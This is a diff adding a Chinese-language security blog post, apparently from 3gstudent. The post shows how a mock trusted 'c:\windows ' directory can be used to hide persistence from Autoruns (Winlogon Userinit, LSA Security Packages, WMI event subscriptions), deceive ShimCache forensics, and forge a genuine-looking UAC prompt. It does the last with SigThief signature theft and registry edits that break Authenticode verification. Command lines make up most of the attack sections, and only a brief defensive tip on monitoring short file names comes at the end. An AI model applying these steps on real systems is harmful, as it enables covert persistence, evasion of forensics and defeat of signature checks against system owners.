@@ -1,0 +1,269 @@
+I"�7<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在上篇文章<a href="https://3gstudent.github.io/%E9%80%9A%E8%BF%87%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87UAC%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">《通过模拟可信目录绕过UAC的利用分析》</a>对通过模拟可信目录绕过UAC的方法进行了分析，本文将结合自己的经验，继续介绍模拟可信目录的另外三种利用技巧，最后给出防御建议</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>利用模拟可信目录绕过Autoruns</li>
+  <li>利用模拟可信目录欺骗ShimCache</li>
+  <li>利用模拟可信目录伪造正常的UAC弹框</li>
+</ul>
+
+<h2 id="0x02-利用模拟可信目录绕过autoruns">0x02 利用模拟可信目录绕过Autoruns</h2>
+<hr />
+
+<p>绕过原理：</p>
+
+<p>Autoruns默认不显示带有微软签名的文件，如果文件包含微软签名，默认不会显示在Autoruns面板</p>
+
+<p>在Windows系统的启动位置写入模拟可信目录下的文件，由于被识别为正常带有微软签名的文件，默认将不会显示在Autoruns面板</p>
+
+<p>经过测试，并不适用于所有的启动位置，具体测试如下：</p>
+
+<p>创建模拟的可信目录，添加测试文件：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
+md "\\?\c:\windows \system32"
+copy c:\test\putty.exe "\\?\c:\windows \system32\notepad.exe"
+copy c:\test\calc.dll "\\?\c:\windows \system32\atl.dll"
+</code></pre></div></div>
+
+<h3 id="1注册启动项hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun">1、注册启动项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></h3>
+
+<p>系统启动时启动文件<code class="language-plaintext highlighter-rouge">"C:\Windows \System32\notepad.exe"</code>，添加注册表的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RunTest /t REG_SZ /d "\"c:\windows \system32\notepad.exe\""
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">"</code>在cmd下转义后用<code class="language-plaintext highlighter-rouge">\"</code>表示</p>
+
+<p>Autoruns检测注册表项，将其识别为notepad.exe，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-1.png" alt="Alt text" /></p>
+
+<p>但在系统开机时启动的是正常notepad.exe，而不是putty.exe，失败</p>
+
+<h3 id="2注册启动项hkey_local_machinesoftwaremicrosoftwindows-ntcurrentversionwinlogon下的userinit">2、注册启动项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>下的<code class="language-plaintext highlighter-rouge">Userinit</code></h3>
+
+<p>查询原注册表项：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
+</code></pre></div></div>
+
+<p>默认键值内容为：<code class="language-plaintext highlighter-rouge">C:\Windows\system32\userinit.exe,</code></p>
+
+<p>系统启动时启动文件<code class="language-plaintext highlighter-rouge">"C:\Windows \System32\notepad.exe"</code>，添加注册表的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,\"c:\windows \system32\notepad.exe\"," /f
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">"</code>在cmd下转义后用<code class="language-plaintext highlighter-rouge">\"</code>表示</p>
+
+<p>系统开机时启动putty.exe，Autoruns检测注册表项，将其识别为notepad.exe，成功绕过</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-2.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p>Autoruns默认不显示带有微软签名的文件，所以不会显示上图中的notepad.exe，上图为了演示专门设置为显示所有启动项</p>
+
+<h3 id="3lsa-providers">3、LSA Providers</h3>
+
+<p>注册启动项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的<code class="language-plaintext highlighter-rouge">Security Packages</code></p>
+
+<p>添加键值<code class="language-plaintext highlighter-rouge">"c:\windows \system32\atl.dll"</code></p>
+
+<p>Autoruns检测注册表项，将其识别为atl.dll，成功绕过</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-4.png" alt="Alt text" /></p>
+
+<h3 id="4wmi">4、WMI</h3>
+
+<p>每隔60秒启动文件<code class="language-plaintext highlighter-rouge">"C:\Windows \System32\notepad.exe"</code>，添加wmi的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows \System32\notepad.exe",CommandLineTemplate="C:\Windows \System32\notepad.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
+</code></pre></div></div>
+
+<p>执行后每隔一分钟启动putty.exe，Autoruns检测注册表项，将其识别为notepad.exe，成功绕过</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-3.png" alt="Alt text" /></p>
+
+<p>补充：</p>
+
+<p>查看已注册wmi信息的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list
+</code></pre></div></div>
+
+<p>删除已注册wmi的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="BotFilter82" DELETE
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="BotConsumer23" DELETE
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter="__EventFilter.Name='BotFilter82'" DELETE
+</code></pre></div></div>
+
+<h2 id="0x03-利用模拟可信目录欺骗shimcache">0x03 利用模拟可信目录欺骗ShimCache</h2>
+<hr />
+
+<p>在之前的文章<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96%E4%B8%8E%E6%B8%85%E9%99%A4">《渗透技巧——Windows系统文件执行记录的获取与清除》</a>提到：</p>
+
+<p>ShimCache不仅会记录exe文件的执行，而且会对exe文件同级目录下的文件进行记录(如果文件没有执行，那么Executed的属性为no)</p>
+
+<p>ShimCache只会在系统重新启动后更新(注销当前用户不会更新)</p>
+
+<p>也就是说，想要清除本次系统从启动至关机的ShimCache记录，有两种方法：</p>
+
+<p><strong>(1)修改注册表</strong></p>
+
+<p>备份当前注册表：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" ShimCache.reg
+</code></pre></div></div>
+
+<p>系统重启后，恢复注册表：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg import ShimCache.reg
+</code></pre></div></div>
+
+<p><strong>(2)非正常关机</strong></p>
+
+<p>跳过写入注册表的操作，无法记录本次系统自启动至关机的记录</p>
+
+<p><strong>(3)修改内存</strong></p>
+
+<p>(理论上可行)</p>
+
+<p>这里我尝试利用模拟可信目录欺骗ShimCache，迷惑性很高</p>
+
+<p>方法如下：</p>
+
+<h4 id="1-创建可信目录cwindows-system32">1. 创建可信目录<code class="language-plaintext highlighter-rouge">"c:\windows \system32"</code></h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
+md "\\?\c:\windows \system32"
+</code></pre></div></div>
+
+<h4 id="2-释放文件cwindows-system32calcexe">2. 释放文件<code class="language-plaintext highlighter-rouge">"c:\windows \system32\calc.exe"</code></h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy c:\test\putty.exe "\\?\c:\windows \system32\notepad.exe"
+</code></pre></div></div>
+
+<h4 id="3-执行">3. 执行</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"c:\windows \system32\notepad.exe"
+</code></pre></div></div>
+
+<h4 id="4-重启后查看shimcache">4. 重启后查看ShimCache</h4>
+
+<p>使用工具： https://github.com/mandiant/ShimCacheParser</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" ShimCache.reg
+ShimCacheParser.py -o out.csv -r c:\test\ShimCache.reg -t
+</code></pre></div></div>
+
+<p>查看结果，很具有迷惑性，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/3-1.png" alt="Alt text" /></p>
+
+<h2 id="0x04-利用模拟可信目录伪造正常的uac弹框">0x04 利用模拟可信目录伪造正常的UAC弹框</h2>
+<hr />
+
+<h3 id="1编写需要管理员权限运行的程序">1、编写需要管理员权限运行的程序</h3>
+
+<p>使用Visual Studio</p>
+
+<p>VS工程设置位置：</p>
+
+<p><code class="language-plaintext highlighter-rouge">配置属性</code> -&gt; <code class="language-plaintext highlighter-rouge">链接器</code> -&gt; <code class="language-plaintext highlighter-rouge">清单文件</code>，选择需要管理员权限运行</p>
+
+<p>也可以修改PE文件资源中的manifest</p>
+
+<h3 id="2模拟可信目录释放文件">2、模拟可信目录，释放文件</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy c:\test\testuac.exe "\\?\c:\windows \system32\diskpart.exe"
+</code></pre></div></div>
+
+<p>执行：<code class="language-plaintext highlighter-rouge">"c:\windows \system32\diskpart.exe"</code></p>
+
+<p>弹出UAC提示，显示路径为正常的diskpart.exe，但是没有签名会提示异常，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/4-1.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p>执行正常的diskpart.exe，UAC提示如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/4-2.png" alt="Alt text" /></p>
+
+<p>为了伪造成真正的UAC提示，可以使用PE文件的Authenticode签名伪造</p>
+
+<p>参考资料： <a href="https://3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81">《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》</a></p>
+
+<h3 id="3签名伪造">3、签名伪造</h3>
+
+<p>使用SigThief，地址如下：</p>
+
+<p>https://github.com/secretsquirrel/SigThief</p>
+
+<p>参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigthief.py -i C:\Windows\System32\consent.exe -t c:\test\testuac.exe -o c:\test\new.exe 
+copy c:\test\new.exe "\\?\c:\windows \system32\diskpart.exe" /y
+</code></pre></div></div>
+
+<h3 id="4绕过证书验证">4、绕过证书验证</h3>
+
+<p>添加注册表的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
+</code></pre></div></div>
+
+<p>5、最终测试</p>
+
+<p>再次执行：<code class="language-plaintext highlighter-rouge">"c:\windows \system32\diskpart.exe"</code>，UAC提示同真正的diskpart.exe一样，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/4-3.png" alt="Alt text" /></p>
+
+<h2 id="0x05-防御建议">0x05 防御建议</h2>
+<hr />
+
+<p>对于模拟可信目录的利用，前提是创建了伪造的目录，所以可选择对文件夹的短文件名进行监控</p>
+
+<p>如果出现与系统目录相近的短文件名，可选择进行标记</p>
+
+<p>查看短文件名的方法：  <code class="language-plaintext highlighter-rouge">dir /x</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/5-1.png" alt="Alt text" /></p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>本文介绍了模拟可信目录的另外三种利用技巧，最后给出防御建议</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
